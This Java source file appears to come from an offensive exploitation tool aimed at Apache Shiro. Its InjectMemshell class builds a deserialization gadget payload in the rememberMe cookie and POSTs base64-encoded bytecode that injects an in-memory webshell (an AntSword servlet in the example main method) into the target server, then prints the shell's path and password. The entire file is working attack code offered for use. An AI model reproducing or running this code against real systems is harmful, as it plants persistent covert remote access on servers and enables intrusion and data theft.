package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import javassist.*;
import okhttp3.FormBody;

import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * 内存马注入模块
 */
public class InjectMemshell {
    /**
     * 注入内存马
     * @param targetOBJ 请求对象
     * @param memshellType 内存马类型
     * @param path 内存马路径
     * @param password 内存马密码
     * @param gadget 指定利用gadget
     */
    public static void injectMemshell(TargetOBJ targetOBJ, String memshellType, String path, String password, String gadget) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass memshellCtClass = pool.getCtClass("com.y5neko.shiroexp.memshell." + memshellType);

        // 获取内存马字节码
        byte[] memshellBytes = memshellCtClass.toBytecode();
        String memshellPayload = Base64.getEncoder().encodeToString(memshellBytes);

        // 获取内存马注入的payload
        Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
        Method method = gadget_clazz.getDeclaredMethod("genMemPayload");
        String payload = (String) method.invoke(null);

        // 构造请求头
        Map<String, String> headers = new HashMap<>();
        headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
        headers.put("p", password);
        headers.put("path", path);

        // 构造POST请求体
        FormBody formBody = new FormBody.Builder().add("token", memshellPayload).build();

        // 注入内存马
        ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, formBody, headers, "POST");
//        System.out.println(Components.bytesToString(responseOBJ.getResponse()));
        if (Tools.bytesToString(responseOBJ.getResponse()).contains("Success")) {
            System.out.println(Log.buffer_logging("SUCC", "内存马注入成功"));
            System.out.println("----------");
            System.out.println("类型: " + memshellType);
            System.out.println("地址: " + targetOBJ.getUrl() + path);
            System.out.println("密码: " + password);
            System.out.println("----------");
        } else {
            System.out.println(Log.buffer_logging("EROR", "内存马注入失败"));
        }
    }

    public static void main(String[] args) throws Exception {
        injectMemshell(new TargetOBJ("http://127.0.0.1:8080"),"AntSwordServlet", "/qwer333", "test123", "CommonsBeanutils1");
    }
}
